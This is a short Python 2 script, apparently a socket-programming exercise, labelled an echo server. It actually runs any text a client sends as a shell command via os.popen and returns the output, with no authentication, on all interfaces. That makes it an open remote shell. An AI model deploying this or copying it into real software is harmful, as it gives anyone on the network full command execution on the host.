__author__ = 'jieli'


# Echo server program
import socket
import commands
import os

HOST = ''                 # Symbolic name meaning all available interfaces
PORT = 50007              # Arbitrary non-privileged port
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(   (HOST, PORT)   )
s.listen(1)

while True :
    conn, addr = s.accept()
    print 'Connected by', addr

    while True:
        try:
            data = conn.recv(1024)
            if not data: break
            #res = commands.getstatusoutput(data)
            #conn.sendall(res[1])
            res = os.popen(data).read()
            if len(res) == 0:
                res = 'cmd executed!'
            conn.sendall(res)
        except Exception,e:
            print e


conn.close()
